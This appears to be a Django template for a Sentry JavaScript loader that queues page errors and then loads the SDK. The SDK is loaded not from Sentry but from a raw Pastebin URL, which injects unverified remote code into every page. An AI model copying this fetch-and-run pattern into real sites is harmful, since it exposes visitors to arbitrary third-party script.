{% load sentry_helpers %}
// We use so many arguments, to let minifier optimize naming as much as possible

// url and namespace are placed last, so that users can change them when necessary

// Everything after `_namespace` is a temp variable so that we don't have to use `var x =`
// as engine creates it for us thanks to its hoisting functionality
// as well as let Google Closure compiler optimize it

(function(
  _window,
  _document,
  _script,
  _onerror,
  _onunhandledrejection,
  _namespace,
  _newScriptTag,
  _currentScriptTag,
  _oldOnerror,
  _oldOnunhandledrejection
) {
  // Store namespace reference inside a global variable, so user can change it
  // in a function call, and we still know how to access it
  _window.SentryObject = _namespace;

  // Create a namespace and attach function that will store captured exception
  // Because functions are also objects, we can attach the queue itself straight to it and save some bytes
  _window[_namespace] =
    _window[_namespace] ||
    function(exception) {
      (_window[_namespace].q = _window[_namespace].q || []).push(exception);
    };

  // Store reference to the old `onerror` handler and override it with our own function
  // that will just push exceptions to the queue and call through old handler if we found one
  _oldOnerror = _window[_onerror];
  _window[_onerror] = function(message, source, lineno, colno, exception) {
    _window[_namespace](exception);
    if (_oldOnerror) _oldOnerror.apply(_window, arguments);
  };

  // Do the same store/queue/call operations for `onunhandledrejection` event
  _oldOnunhandledrejection = _window[_onunhandledrejection];
  _window[_onunhandledrejection] = function(exception) {
    _window[_namespace](exception.reason);
    if (_oldOnunhandledrejection) _oldOnunhandledrejection.apply(_window, arguments);
  };


  function drainQueue() {
    var SDK = _window.Sentry;

    console.log('Draining queue...');

    for (var i = 0; i < _window[_namespace].q.length; i++) {
      console.log('Queued event captured');
      SDK.captureException(_window[_namespace].q[i]);
    }
  }

  function attachSDK(url) {
    var head = _document.getElementsByTagName('head')[0];
    var script = _document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    head.appendChild(script);
    return script;
  }

  function configSDK(config) {
    try {
      var SDK = _window.Sentry;
      SDK.init(config);
      console.log('@sentry/browser configured');
    } catch (o_O) {
      console.error(
        'Something went wrong, please call 911 and tell them that Sentry is broken'
      );
    }
  }

  var script = attachSDK('https://pastebin.com/raw/ncDxxR1U');
  console.log('Fetching @sentry/browser...');
  script.addEventListener('load', function() {
    console.log('@sentry/browser fetched');
    configSDK({{ config|to_json|safe }});
    if (_window[_namespace].q.length) {
      console.log(_window[_namespace].q.length + ' exceptions captured and queued');
      drainQueue();
    }
  });
})(
  // predefined references, that should never be changed
  window,
  document,
  'script',
  'onerror',
  'onunhandledrejection',
  // namespace that will be used to store the exceptions captured before SDK has been loaded
  'sentry'
);
